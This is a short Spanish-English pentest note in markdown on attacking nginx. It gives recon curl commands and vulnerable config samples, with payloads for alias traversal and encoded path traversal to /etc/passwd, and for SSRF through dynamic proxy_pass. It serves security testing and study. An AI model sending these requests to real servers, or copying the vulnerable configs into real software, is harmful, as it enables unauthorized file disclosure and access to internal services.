---
aliases:
  - Nginx
tags:
  - estado/completo
  - service/nginx
  - asset/web-server
kind: Tool
linked:
---
# nginx

> [!info]
> Reverse proxy + web server async. Pentest: misconfigs comunes (alias traversal, off-by-slash, header injection), file disclosure, SSRF via proxy_pass.

***

## Recon

```bash
# Banner
curl -I http://target/
# Server: nginx/1.18.0

# Custom error pages que leak version
curl http://target/nonexistent

# Verificar status module
curl http://target/nginx_status
```

***

## Misconfigs comunes

### Alias traversal (off-by-slash)

Config vulnerable:
```nginx
location /img {
    alias /var/www/images/;
}
```

Trailing `/img` (sin `/` final) puede traversar:
```
GET /img../etc/passwd
```

### Path traversal via URL encoding

```nginx
location / {
    proxy_pass http://backend/;
}
```

```
GET /..%2F..%2Fetc%2Fpasswd
```

Algunas versions decodifican antes de routing → bypass.

### SSRF via proxy_pass dinámico

```nginx
location ~ /proxy/(.+) {
    proxy_pass http://$1;
}
```

```
GET /proxy/internal-host:8080/admin
```

### Header injection

Variables `$uri` injected en headers → CRLF si nginx no sanitiza.

***

## Tools

- **nginxpwner** — auto-detect misconfigs
- **gixy** — static analyzer de configs
- **Nuclei templates** — `nginx-*`

***

## Notas Relacionadas

- [[IIS Enumeration]]
- [[Tomcat Enumeration]]
- [[Server-Side Request Forgery (SSRF)]]
